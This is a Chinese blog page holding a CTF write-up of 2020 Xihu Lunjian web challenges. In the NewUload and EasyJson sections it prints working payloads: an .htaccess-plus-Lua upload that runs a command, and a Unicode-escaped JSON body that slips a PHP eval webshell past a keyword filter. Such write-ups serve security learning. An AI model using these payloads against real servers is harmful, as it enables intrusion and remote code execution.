@@ -1,0 +1,1336 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="JOe KKK">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="JOe KKK">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="2020 西湖论剑前言记得当时第一次参加比赛，虐的好惨，题目很好，网速很快，就是做不出，全程凑数，新手村的我刚出门就直接面对百级 boss，没有任何游戏体验。重新开始，今年继续 1.NewUload  文件上传，过滤了文件后缀名和文件内容都过滤了 php 关键字，甚至短标签的尖括号都不行，但是，没想到居然可以通过换行来绕过后缀名检测和用图片马来绕过文件内容的检测。  就能从 phpinfo 中发现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020西湖论剑-web复现">
+<meta property="og:url" content="http://example.com/2021/04/02/CTF%E6%AF%94%E8%B5%9B/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/index.html">
+<meta property="og:site_name" content="MA4OUT7">
+<meta property="og:description" content="2020 西湖论剑前言记得当时第一次参加比赛，虐的好惨，题目很好，网速很快，就是做不出，全程凑数，新手村的我刚出门就直接面对百级 boss，没有任何游戏体验。重新开始，今年继续 1.NewUload  文件上传，过滤了文件后缀名和文件内容都过滤了 php 关键字，甚至短标签的尖括号都不行，但是，没想到居然可以通过换行来绕过后缀名检测和用图片马来绕过文件内容的检测。  就能从 phpinfo 中发现">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-log.csdnimg.cn/img_convert/69458210dda3f04cb0bab6cc314be43a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201013194700704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1RNXzEwMjQ=,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="article:published_time" content="2021-04-02T08:06:06.000Z">
+<meta property="article:modified_time" content="2021-04-06T09:46:47.717Z">
+<meta property="article:author" content="JOe KKK">
+<meta property="article:tag" content="CTF比赛">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-log.csdnimg.cn/img_convert/69458210dda3f04cb0bab6cc314be43a.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <title>2020西湖论剑-web复现 · Ma4out7&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Ma4out7&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">2020西湖论剑-web复现</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Ma4out7's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            2020西湖论剑-web复现
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF比赛">CTF比赛</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.5k</span>阅读时长: <span class="post-count reading-time">6 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2021/04/02</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="2020-西湖论剑"><a href="#2020-西湖论剑" class="headerlink" title="2020 西湖论剑"></a>2020 西湖论剑</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>记得当时第一次参加比赛，虐的好惨，题目很好，网速很快，就是做不出，全程凑数，新手村的我刚出门就直接面对百级 boss，没有任何游戏体验。重新开始，今年继续</p>
+<h3 id="1-NewUload"><a href="#1-NewUload" class="headerlink" title="1.NewUload"></a>1.NewUload</h3><p><img src="https://img-log.csdnimg.cn/img_convert/69458210dda3f04cb0bab6cc314be43a.png"></p>
+<ul>
+<li><p>文件上传，过滤了文件后缀名和文件内容都过滤了 php 关键字，甚至短标签的尖括号都不行，但是，没想到居然可以通过换行来绕过后缀名检测和用图片马来绕过文件内容的检测。<br><img src="https://img-blog.csdnimg.cn/20201013194700704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1RNXzEwMjQ=,size_16,color_FFFFFF,t_70#pic_center"></p>
+</li>
+<li><p>就能从 phpinfo 中发现 disable_functions 中禁用了很多函数。网上有两种方法</p>
+</li>
+<li><p>第一种就是利用.htaccess+lua。lua 是也是一种轻量化脚本语言，在 PHP 环境中可以被解析</p>
+<ul>
+<li>先上传一个.htaccess 文件，作用是使 lua 文件解析生效。</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.htacces</span><br><span class="line">AddHandler lua-script .lua</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>然后上传一个 1.lua 文件，再访问 1.lua 就能成功得到 flag。</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">--[<span class="number">1.</span>lua --]</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;string&quot;</span></span><br><span class="line"></span><br><span class="line">--[[</span><br><span class="line">    This is the <span class="keyword">default</span> method name <span class="keyword">for</span> Lua handlers, see the optional</span><br><span class="line">    <span class="function"><span class="keyword">function</span>-<span class="title">name</span> <span class="title">in</span> <span class="title">the</span> <span class="title">LuaMapHandler</span> <span class="title">directive</span> <span class="title">to</span> <span class="title">choose</span> <span class="title">a</span> <span class="title">different</span></span></span><br><span class="line"><span class="function">    <span class="title">entry</span> <span class="title">point</span>.</span></span><br><span class="line"><span class="function">--]]</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">handle</span>(<span class="params">r</span>)</span></span><br><span class="line"><span class="function">    <span class="title">r</span>.<span class="title">content_type</span> = &quot;<span class="title">text</span>/<span class="title">plain</span>&quot;</span></span><br><span class="line"><span class="function">    <span class="title">r</span>:<span class="title">puts</span>(<span class="params"><span class="string">&quot;Hello Lua World!\n&quot;</span></span>)</span></span><br><span class="line"><span class="function">    <span class="title">local</span> <span class="title">t</span> = <span class="title">io</span>.<span class="title">popen</span>(<span class="params"><span class="string">&#x27;/readflag&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    <span class="title">local</span> <span class="title">a</span> = <span class="title">t</span>:<span class="title">read</span>(<span class="params"><span class="string">&quot;*all&quot;</span></span>)</span></span><br><span class="line"><span class="function">    <span class="title">r</span>:<span class="title">puts</span>(<span class="params">a</span>)</span></span><br><span class="line"><span class="function">    <span class="title">if</span> <span class="title">r</span>.<span class="title">method</span> == &#x27;<span class="title">GET</span>&#x27; <span class="title">then</span></span></span><br><span class="line"><span class="function">        <span class="title">for</span> <span class="title">k</span>, <span class="title">v</span> <span class="title">in</span> <span class="title">pairs</span>(<span class="params"> r:parseargs(<span class="params"></span>) </span>) <span class="title">do</span></span></span><br><span class="line"><span class="function">            <span class="title">r</span>:<span class="title">puts</span>(<span class="params"> <span class="keyword">string</span>.format(<span class="params"><span class="string">&quot;%s: %s\n&quot;</span>, k, v</span>) </span>)</span></span><br><span class="line"><span class="function">        <span class="title">end</span></span></span><br><span class="line"><span class="function">    <span class="title">else</span></span></span><br><span class="line"><span class="function">        <span class="title">r</span>:<span class="title">puts</span>(<span class="params"><span class="string">&quot;Unsupported HTTP method &quot;</span> .. r.method</span>)</span></span><br><span class="line"><span class="function">    <span class="title">end</span></span></span><br><span class="line"><span class="function"><span class="title">end</span></span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li><p>第二种方法是弹 shell，但是方法很复杂，有点难懂，参考<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650485991&idx=4&sn=3c29dd773b2b91b9a1668c2d393fc1d3&chksm=83ba5103b4cdd815d343344143771da432a5957d8527b773c499ec0eea480973b3e6d2606838&scene=21#wechat_redirect">大佬文章</a></p>
+<blockquote>
+<p>参考<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/tm_1024/article/details/109056127">https://blog.csdn.net/tm_1024/article/details/109056127</a></p>
+</blockquote>
+</li>
+</ul>
+<h3 id="2-EasyJson"><a href="#2-EasyJson" class="headerlink" title="2.EasyJson"></a>2.EasyJson</h3><ul>
+<li>这题总的来说就是代码审计+（伪）文件上传+RCE,</li>
+<li>主要考点就是绕过 json 格式</li>
+<li>源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;security.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$sandbox = <span class="string">&#x27;sandbox/&#x27;</span>.sha1($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]).<span class="string">&#x27;/&#x27;</span>;<span class="comment">//设置沙盒根据自己ip获得目录</span></span><br><span class="line">var_dump($sandbox);</span><br><span class="line"><span class="keyword">if</span>(!file_exists($sandbox))&#123;<span class="comment">//如果不存在就创建</span></span><br><span class="line">    mkdir($sandbox);</span><br><span class="line">    file_put_contents($sandbox.<span class="string">&quot;index.php&quot;</span>,<span class="string">&quot;&lt;?php echo &#x27;Welcome To Dbapp OSS.&#x27;;?&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$action = $_GET[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">$content = file_get_contents(<span class="string">&quot;php://input&quot;</span>);<span class="comment">//获得post数据流</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($action == <span class="string">&quot;write&quot;</span> &amp;&amp;  SecurityCheck(<span class="string">&#x27;filename&#x27;</span>,$_GET[<span class="string">&#x27;filename&#x27;</span>]) &amp;&amp;SecurityCheck(<span class="string">&#x27;content&#x27;</span>,$content))&#123;<span class="comment">//验证函数</span></span><br><span class="line">    $content = json_decode($content);<span class="comment">//json格式解密</span></span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    $filecontent = $content-&gt;content;<span class="comment">//获得content变量的值</span></span><br><span class="line">    $filename = $sandbox.$filename;</span><br><span class="line">    file_put_contents($filename,$filecontent.<span class="string">&quot;\n Powered By Dbapp OSS.&quot;</span>);<span class="comment">//写入文件，利用点</span></span><br><span class="line">&#125;<span class="keyword">elseif</span>($action == <span class="string">&quot;reset&quot;</span>)&#123;<span class="comment">//删除操作</span></span><br><span class="line">    $files = scandir($sandbox);</span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_dir($file))&#123;</span><br><span class="line">            <span class="keyword">if</span>($file !== <span class="string">&quot;index.php&quot;</span>)&#123;</span><br><span class="line">                unlink($sandbox.$file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Security Check Failed.&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>get 要传入 action,filename 和 source 这三个参数。source 是保证下面的 php 命令可以执行，action 是我们要执行的操作，肯定是 write 了。filename 是我们要写的文件的名字。<br>post 要传入 json 格式的参数，它的 content 键的值是我们要写入文件的内容。<br>审清楚这些，应该做的就是写一个可以 RCE 的文件，因为我们写的文件的目录已知，文件名已知，然后再读取那个文件，用蚁剑连或者进行 RCE。</p>
+<p>第一个绕过点是文件名。因为习惯性给文件命名 1.php，在这里直接没通过那个安全检测了。我一开始以为是后缀 php 被过滤，后来我把后缀去掉发现还是被阻了，然后我把文件改成了 feng.php 就好了，才发现只有字母给文件命名才行。<br>接下来就是 post 传入的参数了。post 传入后赋给变量$content，但是$content 要被 json_decode 一次。我一开始尝试这样写<code>&#123;&quot;content&quot;:&quot;&lt;?php eval($_GET[&#39;a&#39;]);?&gt;&quot;&#125;</code>,发现爆 check fail。我尝试了大小写双写绕过后还是不行，然后就卡住了。。因为真的对 json 这个内容不太了解。</p>
+<p>看了 WP，原来 content 里的 on 也被过滤了。这是我没想到的。怎么绕过呢？尝试用 unicode 编码来绕过。原理可以参考下面文章：<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/306">浅谈 json 参数解析对 waf 绕过的影响</a></p>
+<ul>
+<li>被过滤的全部使用 Unicode 编码之后即可，<code>&#123;&quot;\u0063\u006f\u006e\u0074\u0065\u006e\u0074&quot;:&quot;&lt;?\u0070\u0068\u0070 eval($_GET[&#39;a&#39;]);?&gt;&quot;&#125;</code><br>再访问一下<a target="_blank" rel="noopener" href="http://easyjson.xhlj.wetolink.com/sandbox/9beb98a8de69744aec8456acc562a3685f92fabd/feng.php">http://easyjson.xhlj.wetolink.com/sandbox/9beb98a8de69744aec8456acc562a3685f92fabd/feng.php</a><br>然后进行 RCE。通过查看 phpinfo，可以发现这题没有任何函数被禁用，因此获取 flag 就十分容易了。<br>找到 security.php 的源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: meizj</span></span><br><span class="line"><span class="comment"> * Date: 2020/2/7</span></span><br><span class="line"><span class="comment"> * Time: 1:31 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SecurityCheck</span>(<span class="params">$type,$content</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> ($type)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;filename&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, $content) !== <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;content&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span>(stristr($content,<span class="string">&#x27;on&#x27;</span>) || stristr($content,<span class="string">&#x27;html&#x27;</span>) || stristr($content,<span class="string">&#x27;type&#x27;</span>) || stristr($content,<span class="string">&#x27;flag&#x27;</span>) || stristr($content,<span class="string">&#x27;upload&#x27;</span>) || stristr($content,<span class="string">&#x27;file&#x27;</span>) || stristr($content,<span class="string">&#x27;php&#x27;</span>)  || stristr($content,<span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>文件名只能 a-z 的字母，对于 post 的参数，则过滤了 on,html,type,flag,upload,file,php 和.</p>
+<blockquote>
+<p>参考<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/109107736">https://blog.csdn.net/rfrder/article/details/109107736</a>?<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/108967312">https://blog.csdn.net/qq_46091464/article/details/108967312</a>?</p>
+</blockquote>
+<h3 id="3-HardXss"><a href="#3-HardXss" class="headerlink" title="3.HardXss"></a>3.HardXss</h3><p>这题考的是 ServiceWorker，</p>
+<blockquote>
+<p>简单的讲，是浏览器在后台独立于网页运行的脚本。可以简单的认为是一个介于客户端和服务端之间的代理服务器，最重要的作用之一就是缓存离线资源。</p>
+</blockquote>
+<blockquote>
+<p>SW 提供了一组 API，能够拦截当前站点产生 HTTP 请求，还能控制返回结果。因此，SW 拦住请求后，使用 Cache Storage 里的内容进行返回，就可以实现离线缓存的功能。当 Cache Storage 不存在请求的资源时再向服务器请求,cache.put 可以选择性地将请求资源加载到 cache storage 中。如果不手动取消已经注册过的 sw 服务,刷新/重新打开页面都会启动站点的 sw 服务，这为我们持久化 XSS 提供了一定的条件。</p>
+</blockquote>
+<ul>
+<li>已经找不到 writeup 了….那就这样吧。😅🤓</li>
+</ul>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://example.com">JOe KKK</a>
+            <p>原文链接：<a href="http://example.com/2021/04/02/CTF%E6%AF%94%E8%B5%9B/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">http://example.com/2021/04/02/CTF%E6%AF%94%E8%B5%9B/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/</a>
+            <p>发表日期：<a href="http://example.com/2021/04/02/CTF%E6%AF%94%E8%B5%9B/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">April 2nd 2021, 4:06:06 pm</a>
+            <p>更新日期：<a href="http://example.com/2021/04/02/CTF%E6%AF%94%E8%B5%9B/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">April 6th 2021, 5:46:47 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
